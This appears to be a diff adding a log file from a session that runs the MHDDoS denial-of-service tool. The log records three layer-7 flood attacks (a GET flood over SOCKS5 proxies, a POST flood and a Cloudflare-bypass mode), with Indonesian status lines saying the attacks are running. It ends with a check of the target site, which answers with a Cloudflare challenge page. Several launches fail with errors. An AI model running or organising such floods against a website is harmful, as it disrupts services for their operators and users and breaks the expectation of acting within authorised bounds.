@@ -1,0 +1,32 @@
+PID: 72035
+=== ATTACK 1: Layer 7 GET Flood dengan SOCKS5 ===
+/tmp/MHDDoS/start.py:53: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1
+/tmp/MHDDoS/start.py:55: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1_1
+Traceback (most recent call last):
+  File "/tmp/MHDDoS/start.py", line 1716, in <module>
+    threads = int(argv[4])
+              ^^^^^^^^^^^^
+ValueError: invalid literal for int() with base 10: '/tmp/proxy_lists/final_socks5.txt'
+=== ATTACK 2: Layer 7 POST Flood ===
+PID: 72038
+python3: can't open file '/home/runner/start.py': [Errno 2] No such file or directory
+PID: 72041
+
+=== Semua 3 attack sedang berjalan ===
+Menunggu 30 detik...
+=== ATTACK 3: Layer 7 CFBUAM (Cloudflare Bypass) ===
+python3: can't open file '/home/runner/start.py': [Errno 2] No such file or directory
+
+=== Verifikasi website ===
+HTTP/2 403 
+date: Sat, 24 Oct 2026 08:13:57 GMT
+content-type: text/html; charset=UTF-8
+content-length: 5249
+accept-ch: Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA
+cf-mitigated: challenge
+content-security-policy: default-src 'none'; script-src 'nonce-th7vdRoG1x8s9QfV1Wrvad' 'unsafe-eval' https://challenges.cloudflare.com; script-src-attr 'none'; style-src 'unsafe-inline'; img-src 'self' https://challenges.cloudflare.com; connect-src 'self' https://challenges.cloudflare.com; frame-src 'self' https://challenges.cloudflare.com blob:; child-src 'self' https://challenges.cloudflare.com blob:; worker-src blob:; form-action http: https:; base-uri 'self'
+server: cloudflare
+critical-ch: Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA
+cross-origin-embedder-policy: require-corp
